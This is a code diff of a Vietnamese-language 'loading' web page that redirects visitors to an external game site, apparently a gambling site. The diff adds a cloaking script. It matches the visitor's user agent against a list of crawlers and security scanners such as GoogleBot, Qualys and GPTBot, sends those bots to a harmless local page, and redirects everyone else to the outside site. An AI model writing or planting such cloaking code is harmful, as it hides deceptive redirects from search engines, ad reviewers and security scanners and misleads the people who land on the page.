@@ -6,79 +6,76 @@
     <title>Loading...</title>
     <style>
         body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(to right, #2c3e50, #3498db);
             margin: 0;
             padding: 0;
-            overflow: hidden;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background: linear-gradient(to bottom, #87ceeb, #f0f8ff);
-            color: #333;
-            font-family: 'Arial', sans-serif;
-            font-size: 24px;
-        }
-
-        .loading-container {
+            overflow: hidden;
+            color: #fff;
             text-align: center;
-            animation: fadeIn 1s ease-in-out;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+        .container {
+            max-width: 600px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
         }
 
-        .clouds {
-            position: absolute;
-            top: 20%;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="60"><circle cx="50" cy="30" r="30" fill="white"/><circle cx="30" cy="30" r="30" fill="white"/><circle cx="70" cy="30" r="30" fill="white"/></svg>') repeat-x;
-            animation: moveClouds 60s linear infinite;
+        h1 {
+            font-size: 28px;
+            margin-bottom: 20px;
         }
 
-        @keyframes moveClouds {
-            0% { background-position: 0 0; }
-            100% { background-position: 1000px 0; }
+        p {
+            font-size: 18px;
         }
 
-        .bird {
-            position: absolute;
-            top: 40%;
-            left: -10%;
-            width: 60px;
-            height: 60px;
-            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="60" height="60"><path d="M10 20 C 30 0, 30 40, 50 20" stroke="black" stroke-width="2" fill="none"/></svg>') no-repeat;
-            animation: fly 4s linear infinite;
+        .loading-animation {
+            margin-top: 20px;
+            height: 50px;
+            width: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-top: 5px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
         }
 
-        @keyframes fly {
-            0% { transform: translateX(0); }
-            100% { transform: translateX(120vw); }
-        }
-
-        .message {
-            position: relative;
-            z-index: 10;
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
         }
     </style>
 </head>
 <body>
-
-    <div class="clouds"></div>
-    <div class="bird"></div>
-    
-    <div class="loading-container">
-        <div class="message">Vui lòng đợi 3 giây...</div>
+    <div class="container">
+        <h1>Vui lòng đợi 2 giây...</h1>
+        <p>Chúng tôi đang chuẩn bị trang game cho bạn!</p>
+        <div class="loading-animation"></div>
     </div>
 
     <script>
-        setTimeout(function(){
-            window.location.href = "https://hit88.games/";
-        }, 3000);
+        setTimeout(function() {
+            const userAgent = navigator.userAgent;
+            const botKeywords = ["GoogleBot", "Qualys", "Amazonbot", "BingBot", "Synthetic Bot", "Google AdsBot", "Taboola", "GoogleOther", "GPTBot", "Google Image Proxy"];
+
+            const isBot = botKeywords.some(bot => userAgent.includes(bot));
+
+            if (isBot) {
+                window.location.href = "index.html";
+            } else {
+                window.location.href = "https://hit88.games/";
+            }
+        }, 2000);
     </script>
-    
 </body>
 </html>
